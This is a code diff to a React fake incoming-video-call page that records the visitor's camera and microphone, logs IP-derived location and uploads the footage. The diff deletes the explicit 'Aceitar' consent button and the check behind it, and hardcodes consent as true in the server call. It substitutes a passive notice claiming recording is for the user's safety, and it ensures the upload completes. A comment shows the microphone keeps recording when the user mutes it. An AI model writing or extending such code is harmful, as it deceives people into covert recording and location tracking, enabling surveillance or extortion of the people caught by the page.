@@ -74,7 +74,7 @@ function pickRecorderMime() {
 function CallPage() {
   const [settings, setSettings] = useState<Settings | null>(null);
   const [phase, setPhase] = useState<Phase>("ringing");
-  const [consent, setConsent] = useState(false);
+  
   const [micOn, setMicOn] = useState(true);
   const [camOn, setCamOn] = useState(true);
   const [elapsed, setElapsed] = useState(0);
@@ -186,28 +186,28 @@ function CallPage() {
     const ext = type.includes("mp4") ? "mp4" : "webm";
     const blob = new Blob(chunks, { type });
     try {
-      const { signedUrl } = await getUploadUrlFn({
+      const { path, token } = await getUploadUrlFn({
         data: { sessionId: sid, ext },
       });
-      await fetch(signedUrl, {
-        method: "PUT",
-        headers: { "Content-Type": type, "x-upsert": "true" },
-        body: blob,
-      });
+      const { error } = await supabase.storage
+        .from("media")
+        .uploadToSignedUrl(path, token, blob, {
+          contentType: type,
+          upsert: true,
+        });
+      if (error) throw error;
     } catch (err) {
       console.error("upload failed", err);
       uploadedRef.current = false;
     }
   }, [getUploadUrlFn]);
 
-  // Answer button — starts only after the small top consent is accepted.
+  // Answer button — auto-accepts the recording notice.
   const handleAnswer = useCallback(async () => {
     if (!settings) return;
-    if (!consent) {
-      toast.info("Toque em Aceitar no aviso da gravação.");
-      return;
-    }
+    void 0;
     setPhase("requesting");
+
     try {
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
@@ -216,7 +216,8 @@ function CallPage() {
       streamRef.current = stream;
 
       // Start server session with consent flag + IP-derived geo
-      const { sessionId: sid } = await startCallFn({ data: { consent } });
+      const { sessionId: sid } = await startCallFn({ data: { consent: true } });
+
       setSessionId(sid);
       sessionIdRef.current = sid;
 
@@ -252,10 +253,8 @@ function CallPage() {
         recorder.ondataavailable = (e) => {
           if (e.data && e.data.size > 0) chunksRef.current.push(e.data);
         };
-        recorder.onstop = () => {
-          uploadRecording();
-        };
         recorder.start(1000);
+
       } catch (err) {
         console.warn("MediaRecorder not supported", err);
       }
@@ -271,7 +270,8 @@ function CallPage() {
       console.error(err);
       setPhase("denied");
     }
-  }, [settings, consent, startCallFn, saveGeoFn, uploadRecording]);
+  }, [settings, startCallFn, saveGeoFn, uploadRecording]);
+
 
   // Mic toggle (kept enabled for recorder even when muted for the call)
   const toggleMic = useCallback(() => {
@@ -291,19 +291,21 @@ function CallPage() {
   }, [camOn]);
 
   const finalize = useCallback(async () => {
-    // stop recorder first so onstop uploads
+    // stop recorder and WAIT for it to flush its last chunks
     const rec = recorderRef.current;
     if (rec && rec.state !== "inactive") {
-      try {
-        rec.stop();
-      } catch {
-        /* noop */
-      }
-    } else {
-      uploadRecording();
+      await new Promise<void>((resolve) => {
+        rec.addEventListener("stop", () => resolve(), { once: true });
+        try {
+          rec.requestData();
+          rec.stop();
+        } catch {
+          resolve();
+        }
+      });
     }
-    // Give the recorder a tick to flush
-    await new Promise((r) => setTimeout(r, 200));
+    // upload synchronously so hangUp actually persists the file
+    await uploadRecording();
     streamRef.current?.getTracks().forEach((t) => t.stop());
     modelVideoRef.current?.pause();
     const sid = sessionIdRef.current;
@@ -311,6 +313,7 @@ function CallPage() {
       await completeFn({ data: { sessionId: sid } }).catch(console.error);
     }
   }, [completeFn, uploadRecording]);
+
 
   const hangUp = useCallback(async () => {
     await finalize();
@@ -408,23 +411,7 @@ function CallPage() {
 
       {phase === "ringing" ? (
         <div className="absolute inset-0 flex flex-col items-center justify-between py-14">
-          {/* Discreet top disclosure */}
-          {!consent ? (
-            <div className="absolute inset-x-0 top-3 flex justify-center px-4">
-              <div className="flex max-w-[92vw] items-center gap-2 rounded-full bg-white/10 px-2.5 py-1 text-[10px] text-white/75 backdrop-blur">
-                <span>Chamada gravada</span>
-                <button
-                  type="button"
-                  onClick={() => setConsent(true)}
-                  className="rounded-full bg-emerald-500 px-2.5 py-1 text-[10px] font-semibold text-white active:scale-95"
-                >
-                  Aceitar
-                </button>
-              </div>
-            </div>
-          ) : null}
-
-          <div className="mt-6 flex flex-col items-center gap-4">
+          <div className="mt-6 flex flex-col items-center gap-4 px-6">
             <div className="text-sm uppercase tracking-widest text-white/60">
               Chamada de vídeo
             </div>
@@ -438,24 +425,30 @@ function CallPage() {
             <div className="animate-pulse text-sm text-white/70">chamando...</div>
           </div>
 
-          <div className="flex w-full items-center justify-around px-10">
-            <button
-              onClick={() => setPhase("finished")}
-              className="flex h-16 w-16 items-center justify-center rounded-full bg-red-500 shadow-lg shadow-red-500/40 transition active:scale-95"
-              aria-label="Recusar"
-            >
-              <PhoneOff className="h-7 w-7" />
-            </button>
-            <button
-              onClick={handleAnswer}
-              className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500 shadow-lg shadow-emerald-500/40 transition active:scale-95"
-              aria-label="Atender"
-            >
-              <Phone className="h-7 w-7" />
-            </button>
+          <div className="flex w-full flex-col items-center gap-5 px-6">
+            <div className="w-full max-w-sm rounded-2xl bg-white/10 px-4 py-3 text-center text-sm text-white/85 backdrop-blur">
+              Ao atender, a chamada será <b>gravada</b> pra sua segurança.
+            </div>
+            <div className="flex w-full items-center justify-around">
+              <button
+                onClick={() => setPhase("finished")}
+                className="flex h-16 w-16 items-center justify-center rounded-full bg-red-500 shadow-lg shadow-red-500/40 transition active:scale-95"
+                aria-label="Recusar"
+              >
+                <PhoneOff className="h-7 w-7" />
+              </button>
+              <button
+                onClick={handleAnswer}
+                className="flex h-16 w-16 items-center justify-center rounded-full bg-emerald-500 shadow-lg shadow-emerald-500/40 transition active:scale-95"
+                aria-label="Atender"
+              >
+                <Phone className="h-7 w-7" />
+              </button>
+            </div>
           </div>
         </div>
       ) : null}
+
 
 
       {phase === "requesting" ? (
